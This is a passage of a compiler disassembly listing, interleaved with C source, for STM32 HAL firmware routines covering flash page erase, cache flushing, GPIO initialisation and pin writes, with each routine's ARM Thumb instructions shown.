 8001834:	00db      	lsls	r3, r3, #3
 8001836:	f403 63ff 	and.w	r3, r3, #2040	; 0x7f8
 800183a:	490a      	ldr	r1, [pc, #40]	; (8001864 <FLASH_PageErase+0x44>)
 800183c:	4313      	orrs	r3, r2
 800183e:	614b      	str	r3, [r1, #20]
  SET_BIT(FLASH->CR, FLASH_CR_PER);
 8001840:	4b08      	ldr	r3, [pc, #32]	; (8001864 <FLASH_PageErase+0x44>)
 8001842:	695b      	ldr	r3, [r3, #20]
 8001844:	4a07      	ldr	r2, [pc, #28]	; (8001864 <FLASH_PageErase+0x44>)
 8001846:	f043 0302 	orr.w	r3, r3, #2
 800184a:	6153      	str	r3, [r2, #20]
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 800184c:	4b05      	ldr	r3, [pc, #20]	; (8001864 <FLASH_PageErase+0x44>)
 800184e:	695b      	ldr	r3, [r3, #20]
 8001850:	4a04      	ldr	r2, [pc, #16]	; (8001864 <FLASH_PageErase+0x44>)
 8001852:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001856:	6153      	str	r3, [r2, #20]
}
 8001858:	bf00      	nop
 800185a:	370c      	adds	r7, #12
 800185c:	46bd      	mov	sp, r7
 800185e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001862:	4770      	bx	lr
 8001864:	40022000 	.word	0x40022000

08001868 <FLASH_FlushCaches>:
/**
  * @brief  Flush the instruction and data caches.
  * @retval None
  */
void FLASH_FlushCaches(void)
{
 8001868:	b480      	push	{r7}
 800186a:	b083      	sub	sp, #12
 800186c:	af00      	add	r7, sp, #0
  FLASH_CacheTypeDef cache = pFlash.CacheToReactivate;
 800186e:	4b21      	ldr	r3, [pc, #132]	; (80018f4 <FLASH_FlushCaches+0x8c>)
 8001870:	7f1b      	ldrb	r3, [r3, #28]
 8001872:	71fb      	strb	r3, [r7, #7]

  /* Flush instruction cache  */
  if((cache == FLASH_CACHE_ICACHE_ENABLED) ||
 8001874:	79fb      	ldrb	r3, [r7, #7]
 8001876:	2b01      	cmp	r3, #1
 8001878:	d002      	beq.n	8001880 <FLASH_FlushCaches+0x18>
 800187a:	79fb      	ldrb	r3, [r7, #7]
 800187c:	2b03      	cmp	r3, #3
 800187e:	d117      	bne.n	80018b0 <FLASH_FlushCaches+0x48>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Disable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();
 8001880:	4b1d      	ldr	r3, [pc, #116]	; (80018f8 <FLASH_FlushCaches+0x90>)
 8001882:	681b      	ldr	r3, [r3, #0]
 8001884:	4a1c      	ldr	r2, [pc, #112]	; (80018f8 <FLASH_FlushCaches+0x90>)
 8001886:	f423 7300 	bic.w	r3, r3, #512	; 0x200
 800188a:	6013      	str	r3, [r2, #0]
    /* Reset instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_RESET();
 800188c:	4b1a      	ldr	r3, [pc, #104]	; (80018f8 <FLASH_FlushCaches+0x90>)
 800188e:	681b      	ldr	r3, [r3, #0]
 8001890:	4a19      	ldr	r2, [pc, #100]	; (80018f8 <FLASH_FlushCaches+0x90>)
 8001892:	f443 6300 	orr.w	r3, r3, #2048	; 0x800
 8001896:	6013      	str	r3, [r2, #0]
 8001898:	4b17      	ldr	r3, [pc, #92]	; (80018f8 <FLASH_FlushCaches+0x90>)
 800189a:	681b      	ldr	r3, [r3, #0]
 800189c:	4a16      	ldr	r2, [pc, #88]	; (80018f8 <FLASH_FlushCaches+0x90>)
 800189e:	f423 6300 	bic.w	r3, r3, #2048	; 0x800
 80018a2:	6013      	str	r3, [r2, #0]
    /* Enable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();
 80018a4:	4b14      	ldr	r3, [pc, #80]	; (80018f8 <FLASH_FlushCaches+0x90>)
 80018a6:	681b      	ldr	r3, [r3, #0]
 80018a8:	4a13      	ldr	r2, [pc, #76]	; (80018f8 <FLASH_FlushCaches+0x90>)
 80018aa:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 80018ae:	6013      	str	r3, [r2, #0]
  }

  /* Flush data cache */
  if((cache == FLASH_CACHE_DCACHE_ENABLED) ||
 80018b0:	79fb      	ldrb	r3, [r7, #7]
 80018b2:	2b02      	cmp	r3, #2
 80018b4:	d002      	beq.n	80018bc <FLASH_FlushCaches+0x54>
 80018b6:	79fb      	ldrb	r3, [r7, #7]
 80018b8:	2b03      	cmp	r3, #3
 80018ba:	d111      	bne.n	80018e0 <FLASH_FlushCaches+0x78>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Reset data cache */
    __HAL_FLASH_DATA_CACHE_RESET();
 80018bc:	4b0e      	ldr	r3, [pc, #56]	; (80018f8 <FLASH_FlushCaches+0x90>)
 80018be:	681b      	ldr	r3, [r3, #0]
 80018c0:	4a0d      	ldr	r2, [pc, #52]	; (80018f8 <FLASH_FlushCaches+0x90>)
 80018c2:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 80018c6:	6013      	str	r3, [r2, #0]
 80018c8:	4b0b      	ldr	r3, [pc, #44]	; (80018f8 <FLASH_FlushCaches+0x90>)
 80018ca:	681b      	ldr	r3, [r3, #0]
 80018cc:	4a0a      	ldr	r2, [pc, #40]	; (80018f8 <FLASH_FlushCaches+0x90>)
 80018ce:	f423 5380 	bic.w	r3, r3, #4096	; 0x1000
 80018d2:	6013      	str	r3, [r2, #0]
    /* Enable data cache */
    __HAL_FLASH_DATA_CACHE_ENABLE();
 80018d4:	4b08      	ldr	r3, [pc, #32]	; (80018f8 <FLASH_FlushCaches+0x90>)
 80018d6:	681b      	ldr	r3, [r3, #0]
 80018d8:	4a07      	ldr	r2, [pc, #28]	; (80018f8 <FLASH_FlushCaches+0x90>)
 80018da:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80018de:	6013      	str	r3, [r2, #0]
  }

  /* Reset internal variable */
  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80018e0:	4b04      	ldr	r3, [pc, #16]	; (80018f4 <FLASH_FlushCaches+0x8c>)
 80018e2:	2200      	movs	r2, #0
 80018e4:	771a      	strb	r2, [r3, #28]
}
 80018e6:	bf00      	nop
 80018e8:	370c      	adds	r7, #12
 80018ea:	46bd      	mov	sp, r7
 80018ec:	f85d 7b04 	ldr.w	r7, [sp], #4
 80018f0:	4770      	bx	lr
 80018f2:	bf00      	nop
 80018f4:	2000000c 	.word	0x2000000c
 80018f8:	40022000 	.word	0x40022000

080018fc <HAL_GPIO_Init>:
  * @param  GPIO_Init pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 80018fc:	b480      	push	{r7}
 80018fe:	b087      	sub	sp, #28
 8001900:	af00      	add	r7, sp, #0
 8001902:	6078      	str	r0, [r7, #4]
 8001904:	6039      	str	r1, [r7, #0]
  uint32_t position = 0x00u;
 8001906:	2300      	movs	r3, #0
 8001908:	617b      	str	r3, [r7, #20]
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 800190a:	e148      	b.n	8001b9e <HAL_GPIO_Init+0x2a2>
  {
    /* Get current io position */
    iocurrent = (GPIO_Init->Pin) & (1uL << position);
 800190c:	683b      	ldr	r3, [r7, #0]
 800190e:	681a      	ldr	r2, [r3, #0]
 8001910:	2101      	movs	r1, #1
 8001912:	697b      	ldr	r3, [r7, #20]
 8001914:	fa01 f303 	lsl.w	r3, r1, r3
 8001918:	4013      	ands	r3, r2
 800191a:	60fb      	str	r3, [r7, #12]

    if (iocurrent != 0x00u)
 800191c:	68fb      	ldr	r3, [r7, #12]
 800191e:	2b00      	cmp	r3, #0
 8001920:	f000 813a 	beq.w	8001b98 <HAL_GPIO_Init+0x29c>
    {
      /*--------------------- GPIO Mode Configuration ------------------------*/
      /* In case of Output or Alternate function mode selection */
      if (((GPIO_Init->Mode & GPIO_MODE) == MODE_OUTPUT) || ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF))
 8001924:	683b      	ldr	r3, [r7, #0]
 8001926:	685b      	ldr	r3, [r3, #4]
 8001928:	f003 0303 	and.w	r3, r3, #3
 800192c:	2b01      	cmp	r3, #1
 800192e:	d005      	beq.n	800193c <HAL_GPIO_Init+0x40>
 8001930:	683b      	ldr	r3, [r7, #0]
 8001932:	685b      	ldr	r3, [r3, #4]
 8001934:	f003 0303 	and.w	r3, r3, #3
 8001938:	2b02      	cmp	r3, #2
 800193a:	d130      	bne.n	800199e <HAL_GPIO_Init+0xa2>
      {
        /* Check the Speed parameter */
        assert_param(IS_GPIO_SPEED(GPIO_Init->Speed));

        /* Configure the IO Speed */
        temp = GPIOx->OSPEEDR;
 800193c:	687b      	ldr	r3, [r7, #4]
 800193e:	689b      	ldr	r3, [r3, #8]
 8001940:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OSPEEDR_OSPEED0 << (position * 2u));
 8001942:	697b      	ldr	r3, [r7, #20]
 8001944:	005b      	lsls	r3, r3, #1
 8001946:	2203      	movs	r2, #3
 8001948:	fa02 f303 	lsl.w	r3, r2, r3
 800194c:	43db      	mvns	r3, r3
 800194e:	693a      	ldr	r2, [r7, #16]
 8001950:	4013      	ands	r3, r2
 8001952:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_Init->Speed << (position * 2u));
 8001954:	683b      	ldr	r3, [r7, #0]
 8001956:	68da      	ldr	r2, [r3, #12]
 8001958:	697b      	ldr	r3, [r7, #20]
 800195a:	005b      	lsls	r3, r3, #1
 800195c:	fa02 f303 	lsl.w	r3, r2, r3
 8001960:	693a      	ldr	r2, [r7, #16]
 8001962:	4313      	orrs	r3, r2
 8001964:	613b      	str	r3, [r7, #16]
        GPIOx->OSPEEDR = temp;
 8001966:	687b      	ldr	r3, [r7, #4]
 8001968:	693a      	ldr	r2, [r7, #16]
 800196a:	609a      	str	r2, [r3, #8]

        /* Configure the IO Output Type */
        temp = GPIOx->OTYPER;
 800196c:	687b      	ldr	r3, [r7, #4]
 800196e:	685b      	ldr	r3, [r3, #4]
 8001970:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OTYPER_OT0 << position) ;
 8001972:	2201      	movs	r2, #1
 8001974:	697b      	ldr	r3, [r7, #20]
 8001976:	fa02 f303 	lsl.w	r3, r2, r3
 800197a:	43db      	mvns	r3, r3
 800197c:	693a      	ldr	r2, [r7, #16]
 800197e:	4013      	ands	r3, r2
 8001980:	613b      	str	r3, [r7, #16]
        temp |= (((GPIO_Init->Mode & OUTPUT_TYPE) >> OUTPUT_TYPE_Pos) << position);
 8001982:	683b      	ldr	r3, [r7, #0]
 8001984:	685b      	ldr	r3, [r3, #4]
 8001986:	091b      	lsrs	r3, r3, #4
 8001988:	f003 0201 	and.w	r2, r3, #1
 800198c:	697b      	ldr	r3, [r7, #20]
 800198e:	fa02 f303 	lsl.w	r3, r2, r3
 8001992:	693a      	ldr	r2, [r7, #16]
 8001994:	4313      	orrs	r3, r2
 8001996:	613b      	str	r3, [r7, #16]
        GPIOx->OTYPER = temp;
 8001998:	687b      	ldr	r3, [r7, #4]
 800199a:	693a      	ldr	r2, [r7, #16]
 800199c:	605a      	str	r2, [r3, #4]
      }

#endif /* STM32L471xx || STM32L475xx || STM32L476xx || STM32L485xx || STM32L486xx */

      /* Activate the Pull-up or Pull down resistor for the current IO */
      if ((GPIO_Init->Mode & GPIO_MODE) != MODE_ANALOG)
 800199e:	683b      	ldr	r3, [r7, #0]
 80019a0:	685b      	ldr	r3, [r3, #4]
 80019a2:	f003 0303 	and.w	r3, r3, #3
 80019a6:	2b03      	cmp	r3, #3
 80019a8:	d017      	beq.n	80019da <HAL_GPIO_Init+0xde>
      {
        /* Check the Pull parameter */
        assert_param(IS_GPIO_PULL(GPIO_Init->Pull));

        temp = GPIOx->PUPDR;
 80019aa:	687b      	ldr	r3, [r7, #4]
 80019ac:	68db      	ldr	r3, [r3, #12]
 80019ae:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_PUPDR_PUPD0 << (position * 2U));
 80019b0:	697b      	ldr	r3, [r7, #20]
 80019b2:	005b      	lsls	r3, r3, #1
 80019b4:	2203      	movs	r2, #3
 80019b6:	fa02 f303 	lsl.w	r3, r2, r3
 80019ba:	43db      	mvns	r3, r3
 80019bc:	693a      	ldr	r2, [r7, #16]
 80019be:	4013      	ands	r3, r2
 80019c0:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Pull) << (position * 2U));
 80019c2:	683b      	ldr	r3, [r7, #0]
 80019c4:	689a      	ldr	r2, [r3, #8]
 80019c6:	697b      	ldr	r3, [r7, #20]
 80019c8:	005b      	lsls	r3, r3, #1
 80019ca:	fa02 f303 	lsl.w	r3, r2, r3
 80019ce:	693a      	ldr	r2, [r7, #16]
 80019d0:	4313      	orrs	r3, r2
 80019d2:	613b      	str	r3, [r7, #16]
        GPIOx->PUPDR = temp;
 80019d4:	687b      	ldr	r3, [r7, #4]
 80019d6:	693a      	ldr	r2, [r7, #16]
 80019d8:	60da      	str	r2, [r3, #12]
      }

      /* In case of Alternate function mode selection */
      if ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF)
 80019da:	683b      	ldr	r3, [r7, #0]
 80019dc:	685b      	ldr	r3, [r3, #4]
 80019de:	f003 0303 	and.w	r3, r3, #3
 80019e2:	2b02      	cmp	r3, #2
 80019e4:	d123      	bne.n	8001a2e <HAL_GPIO_Init+0x132>
        /* Check the Alternate function parameters */
        assert_param(IS_GPIO_AF_INSTANCE(GPIOx));
        assert_param(IS_GPIO_AF(GPIO_Init->Alternate));

        /* Configure Alternate function mapped with the current IO */
        temp = GPIOx->AFR[position >> 3u];
 80019e6:	697b      	ldr	r3, [r7, #20]
 80019e8:	08da      	lsrs	r2, r3, #3
 80019ea:	687b      	ldr	r3, [r7, #4]
 80019ec:	3208      	adds	r2, #8
 80019ee:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80019f2:	613b      	str	r3, [r7, #16]
        temp &= ~(0xFu << ((position & 0x07u) * 4u));
 80019f4:	697b      	ldr	r3, [r7, #20]
 80019f6:	f003 0307 	and.w	r3, r3, #7
 80019fa:	009b      	lsls	r3, r3, #2
 80019fc:	220f      	movs	r2, #15
 80019fe:	fa02 f303 	lsl.w	r3, r2, r3
 8001a02:	43db      	mvns	r3, r3
 8001a04:	693a      	ldr	r2, [r7, #16]
 8001a06:	4013      	ands	r3, r2
 8001a08:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Alternate) << ((position & 0x07u) * 4u));
 8001a0a:	683b      	ldr	r3, [r7, #0]
 8001a0c:	691a      	ldr	r2, [r3, #16]
 8001a0e:	697b      	ldr	r3, [r7, #20]
 8001a10:	f003 0307 	and.w	r3, r3, #7
 8001a14:	009b      	lsls	r3, r3, #2
 8001a16:	fa02 f303 	lsl.w	r3, r2, r3
 8001a1a:	693a      	ldr	r2, [r7, #16]
 8001a1c:	4313      	orrs	r3, r2
 8001a1e:	613b      	str	r3, [r7, #16]
        GPIOx->AFR[position >> 3u] = temp;
 8001a20:	697b      	ldr	r3, [r7, #20]
 8001a22:	08da      	lsrs	r2, r3, #3
 8001a24:	687b      	ldr	r3, [r7, #4]
 8001a26:	3208      	adds	r2, #8
 8001a28:	6939      	ldr	r1, [r7, #16]
 8001a2a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
      }

      /* Configure IO Direction mode (Input, Output, Alternate or Analog) */
      temp = GPIOx->MODER;
 8001a2e:	687b      	ldr	r3, [r7, #4]
 8001a30:	681b      	ldr	r3, [r3, #0]
 8001a32:	613b      	str	r3, [r7, #16]
      temp &= ~(GPIO_MODER_MODE0 << (position * 2u));
 8001a34:	697b      	ldr	r3, [r7, #20]
 8001a36:	005b      	lsls	r3, r3, #1
 8001a38:	2203      	movs	r2, #3
 8001a3a:	fa02 f303 	lsl.w	r3, r2, r3
 8001a3e:	43db      	mvns	r3, r3
 8001a40:	693a      	ldr	r2, [r7, #16]
 8001a42:	4013      	ands	r3, r2
 8001a44:	613b      	str	r3, [r7, #16]
      temp |= ((GPIO_Init->Mode & GPIO_MODE) << (position * 2u));
 8001a46:	683b      	ldr	r3, [r7, #0]
 8001a48:	685b      	ldr	r3, [r3, #4]
 8001a4a:	f003 0203 	and.w	r2, r3, #3
 8001a4e:	697b      	ldr	r3, [r7, #20]
 8001a50:	005b      	lsls	r3, r3, #1
 8001a52:	fa02 f303 	lsl.w	r3, r2, r3
 8001a56:	693a      	ldr	r2, [r7, #16]
 8001a58:	4313      	orrs	r3, r2
 8001a5a:	613b      	str	r3, [r7, #16]
      GPIOx->MODER = temp;
 8001a5c:	687b      	ldr	r3, [r7, #4]
 8001a5e:	693a      	ldr	r2, [r7, #16]
 8001a60:	601a      	str	r2, [r3, #0]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) != 0x00u)
 8001a62:	683b      	ldr	r3, [r7, #0]
 8001a64:	685b      	ldr	r3, [r3, #4]
 8001a66:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
 8001a6a:	2b00      	cmp	r3, #0
 8001a6c:	f000 8094 	beq.w	8001b98 <HAL_GPIO_Init+0x29c>
      {
        /* Enable SYSCFG Clock */
        __HAL_RCC_SYSCFG_CLK_ENABLE();
 8001a70:	4b52      	ldr	r3, [pc, #328]	; (8001bbc <HAL_GPIO_Init+0x2c0>)
 8001a72:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001a74:	4a51      	ldr	r2, [pc, #324]	; (8001bbc <HAL_GPIO_Init+0x2c0>)
 8001a76:	f043 0301 	orr.w	r3, r3, #1
 8001a7a:	6613      	str	r3, [r2, #96]	; 0x60
 8001a7c:	4b4f      	ldr	r3, [pc, #316]	; (8001bbc <HAL_GPIO_Init+0x2c0>)
 8001a7e:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001a80:	f003 0301 	and.w	r3, r3, #1
 8001a84:	60bb      	str	r3, [r7, #8]
 8001a86:	68bb      	ldr	r3, [r7, #8]

        temp = SYSCFG->EXTICR[position >> 2u];
 8001a88:	4a4d      	ldr	r2, [pc, #308]	; (8001bc0 <HAL_GPIO_Init+0x2c4>)
 8001a8a:	697b      	ldr	r3, [r7, #20]
 8001a8c:	089b      	lsrs	r3, r3, #2
 8001a8e:	3302      	adds	r3, #2
 8001a90:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8001a94:	613b      	str	r3, [r7, #16]
        temp &= ~(0x0FuL << (4u * (position & 0x03u)));
 8001a96:	697b      	ldr	r3, [r7, #20]
 8001a98:	f003 0303 	and.w	r3, r3, #3
 8001a9c:	009b      	lsls	r3, r3, #2
 8001a9e:	220f      	movs	r2, #15
 8001aa0:	fa02 f303 	lsl.w	r3, r2, r3
 8001aa4:	43db      	mvns	r3, r3
 8001aa6:	693a      	ldr	r2, [r7, #16]
 8001aa8:	4013      	ands	r3, r2
 8001aaa:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_GET_INDEX(GPIOx) << (4u * (position & 0x03u)));
 8001aac:	687b      	ldr	r3, [r7, #4]
 8001aae:	f1b3 4f90 	cmp.w	r3, #1207959552	; 0x48000000
 8001ab2:	d00d      	beq.n	8001ad0 <HAL_GPIO_Init+0x1d4>
 8001ab4:	687b      	ldr	r3, [r7, #4]
 8001ab6:	4a43      	ldr	r2, [pc, #268]	; (8001bc4 <HAL_GPIO_Init+0x2c8>)
 8001ab8:	4293      	cmp	r3, r2
 8001aba:	d007      	beq.n	8001acc <HAL_GPIO_Init+0x1d0>
 8001abc:	687b      	ldr	r3, [r7, #4]
 8001abe:	4a42      	ldr	r2, [pc, #264]	; (8001bc8 <HAL_GPIO_Init+0x2cc>)
 8001ac0:	4293      	cmp	r3, r2
 8001ac2:	d101      	bne.n	8001ac8 <HAL_GPIO_Init+0x1cc>
 8001ac4:	2302      	movs	r3, #2
 8001ac6:	e004      	b.n	8001ad2 <HAL_GPIO_Init+0x1d6>
 8001ac8:	2307      	movs	r3, #7
 8001aca:	e002      	b.n	8001ad2 <HAL_GPIO_Init+0x1d6>
 8001acc:	2301      	movs	r3, #1
 8001ace:	e000      	b.n	8001ad2 <HAL_GPIO_Init+0x1d6>
 8001ad0:	2300      	movs	r3, #0
 8001ad2:	697a      	ldr	r2, [r7, #20]
 8001ad4:	f002 0203 	and.w	r2, r2, #3
 8001ad8:	0092      	lsls	r2, r2, #2
 8001ada:	4093      	lsls	r3, r2
 8001adc:	693a      	ldr	r2, [r7, #16]
 8001ade:	4313      	orrs	r3, r2
 8001ae0:	613b      	str	r3, [r7, #16]
        SYSCFG->EXTICR[position >> 2u] = temp;
 8001ae2:	4937      	ldr	r1, [pc, #220]	; (8001bc0 <HAL_GPIO_Init+0x2c4>)
 8001ae4:	697b      	ldr	r3, [r7, #20]
 8001ae6:	089b      	lsrs	r3, r3, #2
 8001ae8:	3302      	adds	r3, #2
 8001aea:	693a      	ldr	r2, [r7, #16]
 8001aec:	f841 2023 	str.w	r2, [r1, r3, lsl #2]

        /* Clear Rising Falling edge configuration */
        temp = EXTI->RTSR1;
 8001af0:	4b36      	ldr	r3, [pc, #216]	; (8001bcc <HAL_GPIO_Init+0x2d0>)
 8001af2:	689b      	ldr	r3, [r3, #8]
 8001af4:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001af6:	68fb      	ldr	r3, [r7, #12]
 8001af8:	43db      	mvns	r3, r3
 8001afa:	693a      	ldr	r2, [r7, #16]
 8001afc:	4013      	ands	r3, r2
 8001afe:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_RISING) != 0x00u)
 8001b00:	683b      	ldr	r3, [r7, #0]
 8001b02:	685b      	ldr	r3, [r3, #4]
 8001b04:	f403 1380 	and.w	r3, r3, #1048576	; 0x100000
 8001b08:	2b00      	cmp	r3, #0
 8001b0a:	d003      	beq.n	8001b14 <HAL_GPIO_Init+0x218>
        {
          temp |= iocurrent;
 8001b0c:	693a      	ldr	r2, [r7, #16]
 8001b0e:	68fb      	ldr	r3, [r7, #12]
 8001b10:	4313      	orrs	r3, r2
 8001b12:	613b      	str	r3, [r7, #16]
        }
        EXTI->RTSR1 = temp;
 8001b14:	4a2d      	ldr	r2, [pc, #180]	; (8001bcc <HAL_GPIO_Init+0x2d0>)
 8001b16:	693b      	ldr	r3, [r7, #16]
 8001b18:	6093      	str	r3, [r2, #8]

        temp = EXTI->FTSR1;
 8001b1a:	4b2c      	ldr	r3, [pc, #176]	; (8001bcc <HAL_GPIO_Init+0x2d0>)
 8001b1c:	68db      	ldr	r3, [r3, #12]
 8001b1e:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b20:	68fb      	ldr	r3, [r7, #12]
 8001b22:	43db      	mvns	r3, r3
 8001b24:	693a      	ldr	r2, [r7, #16]
 8001b26:	4013      	ands	r3, r2
 8001b28:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_FALLING) != 0x00u)
 8001b2a:	683b      	ldr	r3, [r7, #0]
 8001b2c:	685b      	ldr	r3, [r3, #4]
 8001b2e:	f403 1300 	and.w	r3, r3, #2097152	; 0x200000
 8001b32:	2b00      	cmp	r3, #0
 8001b34:	d003      	beq.n	8001b3e <HAL_GPIO_Init+0x242>
        {
          temp |= iocurrent;
 8001b36:	693a      	ldr	r2, [r7, #16]
 8001b38:	68fb      	ldr	r3, [r7, #12]
 8001b3a:	4313      	orrs	r3, r2
 8001b3c:	613b      	str	r3, [r7, #16]
        }
        EXTI->FTSR1 = temp;
 8001b3e:	4a23      	ldr	r2, [pc, #140]	; (8001bcc <HAL_GPIO_Init+0x2d0>)
 8001b40:	693b      	ldr	r3, [r7, #16]
 8001b42:	60d3      	str	r3, [r2, #12]

        /* Clear EXTI line configuration */
        temp = EXTI->EMR1;
 8001b44:	4b21      	ldr	r3, [pc, #132]	; (8001bcc <HAL_GPIO_Init+0x2d0>)
 8001b46:	685b      	ldr	r3, [r3, #4]
 8001b48:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b4a:	68fb      	ldr	r3, [r7, #12]
 8001b4c:	43db      	mvns	r3, r3
 8001b4e:	693a      	ldr	r2, [r7, #16]
 8001b50:	4013      	ands	r3, r2
 8001b52:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_EVT) != 0x00u)
 8001b54:	683b      	ldr	r3, [r7, #0]
 8001b56:	685b      	ldr	r3, [r3, #4]
 8001b58:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001b5c:	2b00      	cmp	r3, #0
 8001b5e:	d003      	beq.n	8001b68 <HAL_GPIO_Init+0x26c>
        {
          temp |= iocurrent;
 8001b60:	693a      	ldr	r2, [r7, #16]
 8001b62:	68fb      	ldr	r3, [r7, #12]
 8001b64:	4313      	orrs	r3, r2
 8001b66:	613b      	str	r3, [r7, #16]
        }
        EXTI->EMR1 = temp;
 8001b68:	4a18      	ldr	r2, [pc, #96]	; (8001bcc <HAL_GPIO_Init+0x2d0>)
 8001b6a:	693b      	ldr	r3, [r7, #16]
 8001b6c:	6053      	str	r3, [r2, #4]

        temp = EXTI->IMR1;
 8001b6e:	4b17      	ldr	r3, [pc, #92]	; (8001bcc <HAL_GPIO_Init+0x2d0>)
 8001b70:	681b      	ldr	r3, [r3, #0]
 8001b72:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b74:	68fb      	ldr	r3, [r7, #12]
 8001b76:	43db      	mvns	r3, r3
 8001b78:	693a      	ldr	r2, [r7, #16]
 8001b7a:	4013      	ands	r3, r2
 8001b7c:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_IT) != 0x00u)
 8001b7e:	683b      	ldr	r3, [r7, #0]
 8001b80:	685b      	ldr	r3, [r3, #4]
 8001b82:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001b86:	2b00      	cmp	r3, #0
 8001b88:	d003      	beq.n	8001b92 <HAL_GPIO_Init+0x296>
        {
          temp |= iocurrent;
 8001b8a:	693a      	ldr	r2, [r7, #16]
 8001b8c:	68fb      	ldr	r3, [r7, #12]
 8001b8e:	4313      	orrs	r3, r2
 8001b90:	613b      	str	r3, [r7, #16]
        }
        EXTI->IMR1 = temp;
 8001b92:	4a0e      	ldr	r2, [pc, #56]	; (8001bcc <HAL_GPIO_Init+0x2d0>)
 8001b94:	693b      	ldr	r3, [r7, #16]
 8001b96:	6013      	str	r3, [r2, #0]
      }
    }

    position++;
 8001b98:	697b      	ldr	r3, [r7, #20]
 8001b9a:	3301      	adds	r3, #1
 8001b9c:	617b      	str	r3, [r7, #20]
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001b9e:	683b      	ldr	r3, [r7, #0]
 8001ba0:	681a      	ldr	r2, [r3, #0]
 8001ba2:	697b      	ldr	r3, [r7, #20]
 8001ba4:	fa22 f303 	lsr.w	r3, r2, r3
 8001ba8:	2b00      	cmp	r3, #0
 8001baa:	f47f aeaf 	bne.w	800190c <HAL_GPIO_Init+0x10>
  }
}
 8001bae:	bf00      	nop
 8001bb0:	bf00      	nop
 8001bb2:	371c      	adds	r7, #28
 8001bb4:	46bd      	mov	sp, r7
 8001bb6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001bba:	4770      	bx	lr
 8001bbc:	40021000 	.word	0x40021000
 8001bc0:	40010000 	.word	0x40010000
 8001bc4:	48000400 	.word	0x48000400
 8001bc8:	48000800 	.word	0x48000800
 8001bcc:	40010400 	.word	0x40010400

08001bd0 <HAL_GPIO_WritePin>:
  *            @arg GPIO_PIN_RESET: to clear the port pin
  *            @arg GPIO_PIN_SET: to set the port pin
  * @retval None
  */
void HAL_GPIO_WritePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, GPIO_PinState PinState)
{
 8001bd0:	b480      	push	{r7}
 8001bd2:	b083      	sub	sp, #12
 8001bd4:	af00      	add	r7, sp, #0
 8001bd6:	6078      	str	r0, [r7, #4]
 8001bd8:	460b      	mov	r3, r1
 8001bda:	807b      	strh	r3, [r7, #2]
 8001bdc:	4613      	mov	r3, r2
 8001bde:	707b      	strb	r3, [r7, #1]
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));
  assert_param(IS_GPIO_PIN_ACTION(PinState));

  if(PinState != GPIO_PIN_RESET)
 8001be0:	787b      	ldrb	r3, [r7, #1]
 8001be2:	2b00      	cmp	r3, #0
 8001be4:	d003      	beq.n	8001bee <HAL_GPIO_WritePin+0x1e>
  {
    GPIOx->BSRR = (uint32_t)GPIO_Pin;
 8001be6:	887a      	ldrh	r2, [r7, #2]
 8001be8:	687b      	ldr	r3, [r7, #4]
 8001bea:	619a      	str	r2, [r3, #24]
  }
  else
  {
    GPIOx->BRR = (uint32_t)GPIO_Pin;
  }
}
 8001bec:	e002      	b.n	8001bf4 <HAL_GPIO_WritePin+0x24>
    GPIOx->BRR = (uint32_t)GPIO_Pin;
 8001bee:	887a      	ldrh	r2, [r7, #2]
 8001bf0:	687b      	ldr	r3, [r7, #4]
 8001bf2:	629a      	str	r2, [r3, #40]	; 0x28
}
 8001bf4:	bf00      	nop
 8001bf6:	370c      	adds	r7, #12
 8001bf8:	46bd      	mov	sp, r7
